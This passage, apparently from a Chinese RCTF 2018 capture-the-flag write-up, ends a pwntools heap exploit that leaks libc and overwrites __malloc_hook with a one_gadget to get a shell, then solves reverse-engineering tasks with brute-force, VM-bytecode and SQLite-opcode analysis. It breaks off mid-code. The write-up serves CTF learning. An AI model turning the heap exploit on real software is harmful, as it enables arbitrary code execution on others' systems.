<span class="k">def</span> <span class="nf">newsome</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">con</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'length:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'content:'</span><span class="p">,</span><span class="n">con</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">showsome</span><span class="p">():</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">editsome</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">byteindex</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">byteindex</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">delsome</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>


<span class="n">newsome</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">'0'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x10</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x100</span><span class="o">-</span><span class="mh">0x20</span><span class="p">,</span><span class="s1">'1'</span><span class="o">*</span><span class="mh">0xc0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x33</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'2'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'3'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">'4'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">delsome</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">delsome</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

<span class="n">editsome</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>

<span class="n">newsome</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">'5'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="c1">#6</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x181</span><span class="p">))</span>

<span class="n">delsome</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">delsome</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'7'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="s1">'8'</span><span class="o">*</span><span class="mh">0x70</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x73</span><span class="p">))</span>
<span class="n">delsome</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'9'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'99999999</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">leak</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">libc_base</span><span class="o">=</span><span class="n">leak</span><span class="o">-</span><span class="n">unsorted_off</span>

<span class="n">leaksome</span><span class="p">[</span><span class="s1">'leak'</span><span class="p">]</span><span class="o">=</span><span class="n">leak</span>
<span class="n">leaksome</span><span class="p">[</span><span class="s1">'libc_base'</span><span class="p">]</span><span class="o">=</span><span class="n">libc_base</span>

<span class="c1"># overwrite 2 0x71</span>

<span class="n">newsome</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x70</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">))</span>
<span class="n">delsome</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">delsome</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

<span class="n">newsome</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="s1">'b'</span><span class="o">*</span><span class="mh">0x70</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">fake_fastbin_malloc_hook</span><span class="p">))</span>

<span class="n">delsome</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span>
<span class="n">newsome</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'c'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>


<span class="n">one_gadget</span><span class="o">=</span><span class="mh">0xf02a4</span> 


<span class="n">newsome</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'d'</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">one_gadget</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>

<span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>

<span class="n">show_leak</span><span class="p">()</span>
<span class="n">exp_bp</span><span class="p">(</span><span class="s1">'aaaaaaa'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p>flag: <strong>RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9}</strong></p>
<h2 data-content="1" id="e17698ee163e4849c72d545ba22ebc73">0x03 RE</h2>
<h3 data-content="1" id="5965332201d636a9b55e0af4350a94ca"><strong>babyre</strong></h3>
<p>out数据4字节一组, 流程sub_80488E0, 算法sub_804868B(部分参数不相关), 字符0x20-0x7F穷举就完事儿了.</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="kt">uint32_t</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">a2</span><span class="p">)</span> <span class="c1">// sub_804868B</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">v5</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in</span><span class="p">;</span>
    <span class="n">in</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">527</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="n">a2</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">j</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">&amp;</span> <span class="mh">0x20</span><span class="p">)</span>
            <span class="n">v5</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
        <span class="n">in</span> <span class="o">=</span> <span class="p">(</span><span class="n">in</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v5</span> <span class="o">^</span> <span class="n">in</span> <span class="o">^</span> <span class="p">(</span><span class="n">in</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mh">0x5C743A2E</span> <span class="o">&gt;&gt;</span> <span class="p">(((</span><span class="n">in</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
            <span class="o">+</span> <span class="mi">2</span>
            <span class="o">*</span> <span class="p">(</span><span class="mi">2</span>
                <span class="o">*</span> <span class="p">(((</span><span class="n">in</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
                    <span class="o">+</span> <span class="mi">2</span>
                    <span class="o">*</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="p">((</span><span class="n">in</span> <span class="o">&amp;</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
                        <span class="o">+</span> <span class="p">((</span><span class="n">in</span> <span class="o">&gt;&gt;</span> <span class="mi">26</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)))</span>
                <span class="o">+</span> <span class="p">((</span><span class="n">in</span> <span class="o">&gt;&gt;</span> <span class="mi">9</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)))))</span> <span class="o">&lt;&lt;</span> <span class="mi">31</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">in</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">data</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="c1">// out</span>
    <span class="p">{</span>
        <span class="mh">0xB80C91FE</span><span class="p">,</span><span class="mh">0x70573EFE</span><span class="p">,</span>
        <span class="mh">0xBEED92AE</span><span class="p">,</span><span class="mh">0x7F7A8193</span><span class="p">,</span>
        <span class="mh">0x7390C17B</span><span class="p">,</span><span class="mh">0x90347C6C</span><span class="p">,</span>
        <span class="mh">0xAA7A15DF</span><span class="p">,</span><span class="mh">0xAA7A15DF</span><span class="p">,</span>
        <span class="mh">0x526BA076</span><span class="p">,</span><span class="mh">0x153F1A32</span><span class="p">,</span>
        <span class="mh">0x545C15AD</span><span class="p">,</span><span class="mh">0x7D8AA463</span><span class="p">,</span>
        <span class="mh">0x526BA076</span><span class="p">,</span><span class="mh">0xFBCB7AA0</span><span class="p">,</span>
        <span class="mh">0x7D8AA463</span><span class="p">,</span><span class="mh">0x9C513266</span><span class="p">,</span>
        <span class="mh">0x526BA076</span><span class="p">,</span><span class="mh">0x6D7DF3E1</span><span class="p">,</span>
        <span class="mh">0xAA7A15DF</span><span class="p">,</span><span class="mh">0x9C513266</span><span class="p">,</span>
        <span class="mh">0x1EDC3864</span><span class="p">,</span><span class="mh">0x9323BC07</span><span class="p">,</span>
        <span class="mh">0x7D8AA463</span><span class="p">,</span><span class="mh">0xFBCB7AA0</span><span class="p">,</span>
        <span class="mh">0x153F1A32</span><span class="p">,</span><span class="mh">0x526BA076</span><span class="p">,</span>
        <span class="mh">0xF5650025</span><span class="p">,</span><span class="mh">0xAA7A15DF</span><span class="p">,</span>
        <span class="mh">0x1EDC3864</span><span class="p">,</span><span class="mh">0xB13AD888</span>
    <span class="p">};</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">j</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">foo</span><span class="p">(</span><span class="n">j</span><span class="p">,</span> <span class="mh">0x1D082C23A72BE4C1</span><span class="p">)</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>flag: <strong>RCTF{Kee1o9_1s_a1ready_so1ved}</strong></p>
<h3 data-content="1" id="6422161a0663bcc28cbcb77126929a2d"><strong>simple vm</strong></h3>
<p>p.bin是虚拟机字节码. 输入长32, 加密后与常量比较.</p>
<p>常量偏移+0x005, hex1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809. 输入偏移+0x111, hex3031323334353637383941424344454630313233343536373839414243444546, 既"0123456789ABCDEF0123456789ABCDEF", 加密后hex101010101010101010106B696F696B69000000000000000000007B797F797B, 猜出算法解密常量.</p>
<div class="highlight"><pre><span></span><span class="n">s</span> <span class="o">=</span> <span class="s2">"1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809"</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"hex"</span><span class="p">)</span>
<span class="n">ss</span> <span class="o">=</span> <span class="s2">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">):</span>
    <span class="n">ss</span> <span class="o">=</span> <span class="n">ss</span> <span class="o">+</span> <span class="p">(</span><span class="s2">"</span><span class="si">%c</span><span class="s2">"</span> <span class="o">%</span> <span class="p">((</span><span class="mh">0x20</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span>
<span class="k">print</span> <span class="n">ss</span>
</pre></div>
<p>字节码分析(未完成):</p>
<blockquote>
<p>0130000000 jmp loc_30<br/>
1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809<br/>
0001020304050600000000</p>
<p>loc_30:<br/>
1500010000 set p<br/>
loc_35:<br/>
0E ++p<br/>
12 read p<br/>
0B putchar<br/>
0C 00010000 35000000 loop [100]+1=0A+1=0B times<br/>
66</p>
<p>1510010000 set p<br/>
loc_47:<br/>
0E ++p<br/>
0A getchar<br/>
66<br/>
16 write p<br/>
0C 10010000 47000000 loop [110]+1=1F+1=20 times<br/>
66</p>
<p>loc_55:</p>
<p>03 40010000 mov reg1, [imm] [140] = 0x20 // xor key<br/>
10 mov reg2, reg1<br/>
11 F1000000 add reg1, imm 0xF1 = 0x111 // input offset<br/>
13 mov reg1, [reg1]<br/>
04 43010000 mov [imm], reg1 [0x143]<br/>
08 mov reg1, ~(reg2 &amp; reg1)<br/>
04 41010000 mov [imm], reg1 [0x141]<br/>
10 mov reg1, reg2<br/>
03 40010000 mov reg1, [imm] [140]<br/>
08 mov reg1, ~(reg2 &amp; reg1)<br/>
04 42010000 mov [imm], reg1<br/>
03 41010000 mov reg1, [imm]<br/>
03 43010000 mov reg1, [imm]<br/>
08 mov reg1, ~(reg2 &amp; reg1)<br/>
10 mov reg1, reg2<br/>
03 42010000 mov reg1, [142]<br/>
08 mov reg1, ~(reg2 &amp; reg1)<br/>
04 44010000 mov [144], reg1<br/>
66<br/>
03 40010000<br/>
11 F1000000<br/>
10<br/>
03 44010000<br/>
16<br/>
05 40010000<br/>
0E<br/>
06 40010000<br/>
0C 45010000 55000000<br/>
66</p>
<p>locB6:<br/>
03 46010000 mov reg1 imm<br/>
11 05000000 add reg1, imm 0x05 // const offset<br/>
13 mov reg1,[reg1]<br/>
10 mov reg2, reg1<br/>
03 46010000 mov reg1 imm<br/>
11 11010000 add reg1 imm 0x0111<br/>
13 mov reg1,[reg1]<br/>
17 cmp                                                //memcmp<br/>
18 60010000 jne<br/>
0C 46010000 B60000000<br/>
17<br/>
60<br/>
1000066000000000000000000000000000000<br/>
000000000000000000000000000000<br/>
0A // 100<br/>
496E70757420466C61673A<br/>
0000000F<br/>
1F // 110<br/>
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br/>
20000000<br/>
00<br/>
1F1F0000000000000000000557726F6E670A52696768740A00000015500100000E120B0C50010000650100000000000000<br/>
1556010000<br/>
0E<br/>
12<br/>
0B<br/>
0C500100007B010000<br/>
0000000000</p>
</blockquote>
<p>flag: <strong>RCTF{09a71bf084a93df7ce3def3ab1bd61f6}</strong></p>
<h3 data-content="1" id="708143a95cb6e310f11fca4abcb4a933"><strong>magic</strong></h3>
<p>第一部分校验_time64返回值. 找msvcrt._time64引用发现校验函数sub_402268, 用multiasm写shellcode调用程序自身代码跑time(运行前手动将00405020处0x100个字节复制到00404C00).</p>
<pre><code>&lt;0000000000404A00&gt;
    lea rax, [0000000000405FF0]
    mov dword ptr ds:[rax], 0x5AFFE78F

    @loop:
    lea rdi, [0000000000405020]
    lea rsi, [0000000000404C00]
    mov rcx, 0x100
    rep movsb

    call 0x0000000000402268

    lea rax, [0000000000405FF0]
    mov eax, [rax]
    cmp eax, 0x5B028A8F
    jge short @breakme

    lea rax, ds:[0x00000000004099D0]
    mov eax, dword ptr ds:[rax]
    test eax, eax
    je short @loop

    @breakme:
    nop ; set a breakpoint here

    @hooktime:
    lea rcx, [0000000000405FF0]
    mov eax, [rcx]
    add eax, 1
    mov [rcx], eax
    ret

&lt;0000000000402275&gt;
    call @hooktime</code></pre>
<p>跑出time: 0x5B00E398</p>
<p>第二部分虚拟机. 断msvcrt.scanf找到校验函数sub_4023B1. 取26字节输入rc4(可能修改过)加密后传入虚拟机. 字节码分析:</p>
<blockquote>
<p>AB0300    mov r3, 00<br/>
AB041A    mov r4, 1A<br/>
AB0066    mov r0, 66<br/>
AA0502    mov r5, r2 ; r2 = input<br/>
A953  add r5, r3<br/>
A005  mov r5, [r5]<br/>
AB06CC    mov r6, CC<br/>
A956  add r5, r6<br/>
AB06FF    mov r6, FF<br/>
AC56  and r5, r6<br/>
AE50  xor r5, r0<br/>
AD00  neg r0<br/>
AA0605    mov r6, r5<br/>
AA0501    mov r5, r1 ; r1 = const<br/>
A953  add r5, r3<br/>
A005  mov r5, [r5]<br/>
AF5600    div r5, 00 ; cmp r5, r6<br/>
A701CC    jcc reg5<br/>
A935  add r3, r5<br/>
AA0503    mov r5, r3<br/>
AF5400    div r5, r4 ; cmp r5, r4<br/>
A6D1CC    jcc !reg5</p>
</blockquote>
<p>常量解密:</p>
<div class="highlight"><pre><span></span><span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">]</span>
<span class="n">s</span> <span class="o">=</span> <span class="s2">""</span>
<span class="n">k</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x99</span><span class="p">]</span> 
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">26</span><span class="p">):</span>
    <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">]</span>
    <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mh">0x100</span><span class="o">-</span><span class="mh">0xCC</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="s2">"</span><span class="si">%02X</span><span class="s2">"</span> <span class="o">%</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
<span class="k">print</span> <span class="n">s</span>
</pre></div>
<p>得到238CBEFD25D765F4B6B3B60FE174A2EFFC384ED21A4AB11096A5. 调试时手动替换rc4数据, 解密得"@ck_For_fun_02508iO2_2iOR}". 输入程序得到字符画:</p>
<pre><code>the part of flag was protected by a magic spell!
@ck_For_fun_02508iO2_2iOR}
.843fFDCb52bc573DA7e336b4BCC97C6E.
.1adC4b19FEBA1Bf9D182FAe8Eac1AeBF.
.CB7EEFeD2B2D6dd76f   bE  D0 ec92.
.DD1C36EDBaf56 63b6 ad83 f5D a60D.
.28CCE56eaBbcF 0Bb9 ed7F 669 aff7.
.    dC   83     4    bf a01     .
.  DAB 2a0 CBD eB74 9eF6 0De 1Bf .
.  E15 d55A276 7A4c fA7 eE72 dc7 .
.  afB bE0fa2e 7Bf9 Eb14 6A5 891 .
.  DCf c907BF9 aFBB 28eA 4dE aB1 .
.  B25 c5B 16d d90f 0cb0 D78 Edd .
.  aEA7   eDaD   07 743A 935 27d .
.D38f5b1FacEaBDeFBEEcbA4 0b9D0A0f.
.ce1A5DFCe012a0a62A5e2D8  8e38C9A.
.CC1b26fF12fC01f8aeB7cAC06c65FCbe.
.e663471A878EcE289bee7c11d7f8CF7b.
.--------------------------------.
    @ck_For_fun_02508iO2_2iOR}
.--------------------------------.</code></pre>
<p>flag: <strong>rctf{h@ck_For_fun_02508iO2_2iOR}</strong></p>
<h3 data-content="1" id="462f41198349bada0d85121fd976357c"><strong>sql</strong></h3>
<p><strong>指令集</strong><a href="https://www.sqlite.org/opcode.html" target="_blank">https://www.sqlite.org/opcode.html</a></p>
<p><strong>类似与汇编代码。先初始化寄存器存的值，然后取值进行比较。</strong></p>
<p><strong>每行数值依次含义为</strong><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e6cb6fc-5d65-1.png"/></p>
<p><strong>（用excel导入一下数据看起来比较清晰）</strong></p>
<p><strong>主要指令流程如下：</strong></p>
<p>goto 93</p>
<p>初始化一系列Interger和String到内存中</p>
<p>goto 2</p>
<p>OpenRead</p>
<p>Rewind # if the table or index is empty, jump to 91 (close)</p>
<p>循环Column（取值）、Function（调用substr(X,Y,Z)函数）、Ne（比较），简化如下：</p>
<p># The substr(X,Y,Z) function returns a substring of input string X that begins<br/>
with the Y-th character and which is Z characters long.</p>
<p>r2,1,1,f</p>
<p>r6,3,1,a</p>
<p>r10,25,1,r</p>
<p>r14,14,1,g</p>
<p>r18,9,1,_</p>
<p>r22,12,1,f</p>
<p>r25,21,1,r</p>
<p>r28,18,1,_</p>
<p>r31,28,1,}</p>
<p>r35,15,1,a</p>
<p>r38,2,1,l</p>
<p>r42,13,1,_</p>
<p>r45,16,1,l</p>
<p>r48,27,1,a</p>
<p>r51,7,1,q</p>
<p>r55,10,1,r</p>
<p>r58,22,1,e</p>
<p>r62,4,1,g</p>
<p>r65,24,1,e</p>
<p>r68,20,1,s</p>
<p>r72,11,1,o</p>
<p>r76,8,1,s</p>
<p>r79,19,1,s</p>
<p>r82,6,1,l</p>
<p>r85,26,1,_</p>
<p>r88,23,1,v</p>
<p>r92,5,1,{</p>
<p>r96,17,1,f</p>
<p>（前三列为substr的三个参数，最后一列为用作比较的字符）</p>
<p>调整一下顺序可得flag</p>
<p>flag: <strong>flag{lqs_rof_galf_esrever_a}</strong></p>
<h3 data-content="1" id="7811bff3c87c0361176741ddbf2943cb"><strong>compiler</strong></h3>
<p>第一部分compiler, gcc编译helloworld.c, 在程序中发现字符串:</p>
<blockquote>
<p>RCTF_HINT1: Compiler flag part 1 is here, but where is part 2?</p>
<p>You can think about this question: Why does this function exists in this binary?</p>
<p>RCTF_HINT2: part 2 is not in gcc, dont waste you time.</p>
</blockquote>
<p>断libc_start_main在栈中找到part1:"RCTF{Without".</p>
<p>第二部分bash, 先12次flag, 再2次prince(executable name为bash)跳过公主死亡的剧情, 继续flag得到hint:</p>
<blockquote>
<p>The flag is (part1, plain(hash1), plain(hash2), plain(hash3), '}').join('')<br/>
The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526<br/>
I know the queen hijacked me by a function which used this hash algorithm!</p>
</blockquote>
<p>hijack用的是add_alias函数, hash算法在hash_insert中:</p>
<div class="highlight"><pre><span></span><span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="n">string</span><span class="p">;</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">hash</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="n">v4</span><span class="p">;</span> <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="n">v5</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">v5</span><span class="p">;</span>
      <span class="n">hash</span> <span class="o">=</span> <span class="n">v4</span> <span class="o">^</span> <span class="mh">0x8B</span> <span class="o">*</span> <span class="n">hash</span><span class="p">;</span>
    <span class="p">}</span>
</pre></div>
<p>穷举明文:</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>

<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">base</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">ch</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
